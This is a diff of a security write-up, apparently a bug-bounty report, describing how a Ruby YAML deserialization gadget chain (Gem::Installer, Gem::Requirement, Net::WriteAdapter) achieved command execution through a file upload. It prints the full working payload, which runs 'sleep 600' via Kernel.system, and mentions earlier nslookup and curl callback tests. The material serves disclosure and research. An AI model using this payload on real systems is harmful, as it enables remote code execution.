@@ -18,27 +18,27 @@ Several researchers previously identified gadget chains in Ruby that could lead 
 I first tested the Gem::Requirement chain using nslookup and curl commands to a Burp collaborator but received no DNS lookup. After this chain failed, I tested the Gem::Installer chain with the same commands, but again no DNS lookup occurred.
 
 After several attempts, I decided to try the sleep command for 10 minutes with the Gem::Installer chain.
-> ```yaml
-> ---
-> - !ruby/object:Gem::Installer
->     i: x
-> - !ruby/object:Gem::SpecFetcher
->     i: y
-> - !ruby/object:Gem::Requirement
->   requirements:
->     !ruby/object:Gem::Package::TarReader
->     io: &1 !ruby/object:Net::BufferedIO
->       io: &1 !ruby/object:Gem::Package::TarReader::Entry
->          read: 0
->          header: "abc"
->       debug_output: &1 !ruby/object:Net::WriteAdapter
->          socket: &1 !ruby/object:Gem::RequestSet
->              sets: !ruby/object:Net::WriteAdapter
->                  socket: !ruby/module 'Kernel'
->                  method_id: :system
->              git_set: sleep 600
->          method_id: :resolve
-> ```
+```yaml
+---
+- !ruby/object:Gem::Installer
+     i: x
+- !ruby/object:Gem::SpecFetcher
+     i: y
+- !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &1 !ruby/object:Net::BufferedIO
+       io: &1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &1 !ruby/object:Net::WriteAdapter
+          socket: &1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: sleep 600
+          method_id: :resolve
+```
 
 Uploading the YAML file caused the status icon to display a loading animation for 10 minutes, indicating that the sleep command executed successfully.
 
